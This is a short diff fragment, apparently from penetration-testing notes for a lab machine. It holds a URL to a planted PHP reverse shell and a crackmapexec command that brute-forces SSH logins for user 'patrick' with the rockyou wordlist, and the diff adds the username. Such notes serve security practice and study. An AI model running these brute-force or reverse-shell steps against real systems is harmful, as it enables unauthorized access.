@@ -128,7 +128,7 @@ http://192.168.207.39/skins/php-reverse-shell.phtml
 
 # ssh brute force
 crackmapexec ssh 192.168.189.39 -u patrick -p /usr/share/wordlists/rockyou.txt
-
+patrick
 
 
 
